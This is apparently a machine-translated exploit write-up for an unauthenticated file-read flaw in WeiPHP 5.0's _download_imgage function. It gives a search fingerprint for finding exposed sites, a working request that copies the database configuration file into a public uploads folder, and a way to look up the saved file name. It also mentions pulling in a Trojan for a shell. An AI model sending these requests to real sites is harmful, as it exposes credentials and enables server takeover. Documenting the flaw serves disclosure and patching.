# WeiPHP5.0 download_imgage The front desk file is read arbitrarily CNVD-2020-68596

## Vulnerability Description

Weiphp5.0 has a vulnerability to read foreground files, which can read sensitive files such as database configuration.

## Affect Version

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">Weiphp <= 5.0</span>

## Environment construction

[Weiphp5.0 official download reference manual](https://www.weiphp.cn/doc/Initialization_database.html)

Just refer to the official manual to create a website

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/weiphp-1-20220313234124157.png)

## Network surveying and mapping

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">app="WeiPHP"</span>

## Vulnerability reappears



Vulnerability function file: `application\material\controller\Material.php`



Vulnerability function: `_download_imgage`



![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/weiphp-2.png)



```php
public function _download_imgage($media_id, $picUrl = '', $dd = null)
    {
        $savePath = SITE_PATH . '/public/uploads/picture/' . time_format(NOW_TIME, 'Y-m-d');
        mkdirs($savePath);
        $cover_id = 0;
        if (empty($picUrl)) {
            // 获取图片URL
            $url = 'https://api.weixin.qq.com/cgi-bin/material/get_material?access_token=' . get_access_token();
            $param['media_id'] = $media_id;
            // dump($url);
            $picContent = post_data($url, $param, 'json', false);
            $picjson = json_decode($picContent, true);
            // dump($picjson);die;
            if (isset($picjson['errcode']) && $picjson['errcode'] != 0) {
                $cover_id = do_down_image($media_id, $dd['thumb_url']);
                if (!$cover_id) {
                    return 0;
                    exit();
                }
            }
            $picName = NOW_TIME . uniqid() . '.jpg';
            $picPath = $savePath . '/' . $picName;
            $res = file_put_contents($picPath, $picContent);
        } else {
            $content = wp_file_get_contents($picUrl);
            // 获取图片扩展名
            $picExt = substr($picUrl, strrpos($picUrl, '=') + 1);
            if (empty($picExt) || $picExt == 'jpeg' || strpos('jpg,gif,png,jpeg,bmp', $picExt) === false) {
                $picExt = 'jpg';
            }
            $picName = NOW_TIME . uniqid() . '.' . $picExt;
            $picPath = $savePath . '/' . $picName;
            $res = file_put_contents($picPath, $content);
            if (!$res) {
                $cover_id = do_down_image($media_id);
                if (!$cover_id) {
                    return 0;
                    exit();
                }
            }
        }

        if ($res) {
            $file = array(
                'name' => $picName,
                'type' => 'application/octet-stream',
                'tmp_name' => $picPath,
                'size' => $res,
                'error' => 0
            );

            $File = D('home/Picture');
            $cover_id = $File->addFile($file);
        }
        return $cover_id;
}
```



First notice that the function's identification is `public`, that is, the function is called publicly, and the variable `picUrl` is a controllable variable



Analysis from top to bottom according to the code



```php
$savePath = SITE_PATH . '/public/uploads/picture/' . time_format(NOW_TIME, 'Y-m-d');
```









![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/weiphp-3.png)



```php
else {
            $content = wp_file_get_contents($picUrl);
            // 获取图片扩展名
            $picExt = substr($picUrl, strrpos($picUrl, '=') + 1);
            if (empty($picExt) || $picExt == 'jpeg' || strpos('jpg,gif,png,jpeg,bmp', $picExt) === false) {
                $picExt = 'jpg';
            }
            $picName = NOW_TIME . uniqid() . '.' . $picExt;
            $picPath = $savePath . '/' . $picName;
            $res = file_put_contents($picPath, $content);
            if (!$res) {
                $cover_id = do_down_image($media_id);
                if (!$cover_id) {
                    return 0;
                    exit();
                }
            }
```



Analyze the `wp_file_get_contents` method of the incoming variable `picUrl`



```php
$content = wp_file_get_contents($picUrl);
```



Function file location `application\common.php`



![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/weiphp-4.png)



You can see that our parameters are not filtered here, and only an operation about timeout is done. Go back to the function and continue to analyze it downward.



```php
$picExt = substr($picUrl, strrpos($picUrl, '=') + 1);
if (empty($picExt) || $picExt == 'jpeg' || strpos('jpg,gif,png,jpeg,bmp', $picExt) === false) {
                $picExt = 'jpg';
}
$picName = NOW_TIME . uniqid() . '.' . $picExt;
$picPath = $savePath . '/' . $picName;
$res = file_put_contents($picPath, $content);
```



Here is a picture file about the current time and write it to the folder `/public/uploads/picture/`



Let's first try to control the variable `$picUrl` to write the database configuration file into the picture



```plain
/public/index.php/material/Material/_download_imgage?media_id=1&picUrl=./../config/database.php
```



![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/weiphp-5.png)



Check the directory `/public/uploads/picture/` and use notepad to open the written jpg file



![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/weiphp-6.png)



Get the information of the database configuration file. Since this variable is controllable, we can also download the Trojan file through this method, and then getshell by parsing vulnerabilities or other vulnerabilities such as file content.



![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/weiphp-7.png)



I don't know what the file name is under the current conditions, so I go back to the code to continue looking for ways to get the file name



![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/weiphp-8.png)



```php
if ($res) {
            $file = array(
                'name' => $picName,
                'type' => 'application/octet-stream',
                'tmp_name' => $picPath,
                'size' => $res,
                'error' => 0
            );

            $File = D('home/Picture');
            $cover_id = $File->addFile($file);
        }
```



Follow down the `addFile` function



Function location: `application\home\model\Picture.php`



![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/weiphp-9.png)



```php
function addFile($file)
    {
        $data['md5'] = md5_file($file['tmp_name']);
        $id = $this->where('md5', $data['md5'])->value('id');
        if ($id > 0) {
            return $id;
        }

        $info = pathinfo($file['tmp_name']);
        $data['path'] = str_replace(SITE_PATH . '/public', '', $file['tmp_name']);

        $data['sha1'] = hash_file('sha1', $file['tmp_name']);
        $data['create_time'] = NOW_TIME;
        $data['status'] = 1;
        $data['wpid'] = get_wpid();

        $id = $this->insertGetId($data);
        return $id;
    }
```



You can see that this part of the code is written into the Picture table



```php
$id = $this->insertGetId($data);
```



Let’s check the data table of the database and find that all the data uploaded before are cached in this table



![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/weiphp-10.png)



We now need to find places where we do not need to log in to obtain this data, so we can search globally where the Picture table is called



![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/weiphp-11.png)



Find a place to use



```php
function user_pics()
    {
        $map['wpid'] = get_wpid();
        $picList = M('Picture')->where(wp_where($map))
            ->order('id desc')
            ->select();
        $this->assign('picList', $picList);
        exit($this->fetch());
    }
```



Follow up on the `get_wpid` function



```php
function get_wpid($wpid = '')
{
    if (defined('WPID')) {
        return WPID;
    } else {
        return 0;
    }
}
```



View the WPID definition, file location in `config\weiphp_define.php`



![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/weiphp-12.png)



The default value of the definition is 1, so the call here can obtain the content of the Pictrue table in the database, and indirectly know the file content and file name.



Access address: [http://webphp/public/index.php/home/file/user_pids](http://webphp/public/index.php/home/file/user_pids)



![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/weiphp-13.png)



You can see the file name and select download according to the URL address.